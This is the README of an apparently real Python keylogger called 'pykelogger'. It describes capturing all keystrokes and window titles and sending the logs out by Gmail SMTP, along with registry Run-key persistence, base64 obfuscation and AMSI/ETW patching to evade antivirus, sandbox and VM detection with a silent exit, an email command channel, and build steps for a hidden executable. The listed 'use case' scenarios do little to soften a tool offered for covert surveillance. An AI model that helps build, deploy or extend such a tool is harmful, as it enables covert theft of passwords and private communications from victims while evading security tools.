# pykelogger

Python keylogger with email exfiltration, encrypted local backup, and anti-detection.

## Features

- **Keystroke capture** — logs all key presses via `pynput`, including special keys (Enter, Backspace, Ctrl combinations, arrows, etc.)
- **Active window tracking** — records which application/window is in focus when keys are pressed, with timestamps
- **Email exfiltration** — sends captured logs via Gmail SMTP/SSL at configurable intervals
- **Encrypted local backup** — failsafe that XOR-encrypts logs to a local file if email fails
- **Registry persistence** — optional auto-start via `HKCU\...\Run` on boot
- **String obfuscation** — all suspicious strings are base64-encoded at rest, decoded at runtime to evade static AV signatures
- **Anti-detection** — sandbox/VM/debugger environment checks before executing:
  - Debugger detection (`IsDebuggerPresent`, `NtQueryInformationProcess`, hardware breakpoints)
  - Timing analysis (detects sandbox sleep acceleration)
  - VM detection (MAC OUI prefixes, registry keys, drivers, processes)
  - Sandbox detection (low RAM, small disk, suspicious usernames, small display)
  - Configurable threat threshold with silent exit
- **No console window** — built with `console=False` via PyInstaller
- **Stripped binary** — compiled with UPX disabled (UPX is widely flagged by AVs) and symbol stripping enabled

## Requirements

- Python 3.8+
- Gmail account with an [App Password](https://support.google.com/accounts/answer/185833) (2FA must be enabled)

## Setup

1. Install dependencies:
   ```
   pip install -r requirements.txt
   ```

2. Copy the example config and fill in your credentials:
   ```
   copy config.example.py config.py
   ```
   Edit `config.py` with your Gmail address and app password.

3. Run directly:
   ```
   python pykelogger.py
   ```

4. Build standalone executable:
   ```
   pip install pyinstaller
   pyinstaller pykelogger.spec
   ```
   The `.exe` will be at `dist/pykelogger.exe`.

## Configuration (`config.py`)

| Setting | Default | Description |
|---|---|---|
| `EMAIL_SENDER` | — | Gmail address that sends the logs |
| `EMAIL_PASSWORD` | — | Gmail app password |
| `EMAIL_RECEIVER` | — | Email address that receives the logs |
| `SEND_INTERVAL` | 120 | Seconds between email sends |
| `DEBUG` | False | Console print output |
| `PERSISTENCE` | False | Registry auto-start on boot |
| `LOG_FILE_NAME` | data_cache.tmp | Local backup filename (in %APPDATA%) |
| `ENCRYPT_LOGS` | True | XOR-encrypt local backup files |
| `ANTIDETECT` | True | Run environment checks before logging |
| `THREAT_THRESHOLD` | 2 | Exit if this many environment flags trigger |
| `EXIT_SILENTLY` | True | Exit without visible error if flagged |

All credential strings and suspicious identifiers in the code are base64-obfuscated to reduce static detection when compiled to an executable.

## How It Works

```
Start
  → Anti-detection checks (if enabled)
    → If flagged → silent exit
  → Persistence (if enabled) writes registry Run key
  → Background timer starts (sends email every SEND_INTERVAL seconds)
  → pynput keyboard listener begins

On key press:
  → Check active window title (track app switches with timestamps)
  → Map key to human-readable format
  → Append to in-memory log buffer

On timer fire:
  → If buffer has data → attempt SMTP/SSL send to Gmail (3 retries)
  → On success → reset buffer
  → On failure → XOR-encrypt and save backup to %APPDATA%
```

## Use Case Scenarios

- **Parental monitoring** — track child's computer usage and applications accessed
- **Employee productivity auditing** — monitor workstations with consent
- **Personal usage tracking** — audit your own typing habits, application usage patterns, and time spent per window
- **Security research** — studying keylogger behavior for detection/defense development

## Project Structure

```
pykelogger.py          — main entry point: keyboard listener, email send, persistence
config.example.py      — config template (copy to config.py and fill in credentials)
config.py              — your personal config (gitignored, not in repo)
keylogger.cpp          — C++ alternative keylogger with SMTP
kky.py                 — minimal keylogger prototype
antidetect.py          — sandbox/VM/debugger/sandbox detection checks
evasion.py             — AMSI/ETW patching for AV evasion
keyhook.py             — low-level Windows keyboard hook (alternative to pynput)
obfuscation.py         — base64 encode/decode helpers for string obfuscation
crypto_utils.py        — AES/Fernet encryption with PBKDF2 key derivation
storage.py             — encrypted persistent storage with auto-rotation
log_utils.py           — centralized debug logging
pykelogger.spec        — PyInstaller build configuration
plugins/keylogger.py   — keylogger as a plugin module
c2/email.py            — email C2 channel for log exfiltration
c2/parser.py           — command parser for email-based commands
```

## Notes

- Gmail requires an App Password (not your regular password). Enable 2FA on the account, then generate an app password at https://myaccount.google.com/apppasswords.
- The executable will be flagged by some AVs regardless of obfuscation — this is inherent to keylogging software. The anti-detection measures reduce static signature hits but do not guarantee full evasion.
- `PERSISTENCE` writes to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` with a value name that does not contain obvious keywords.
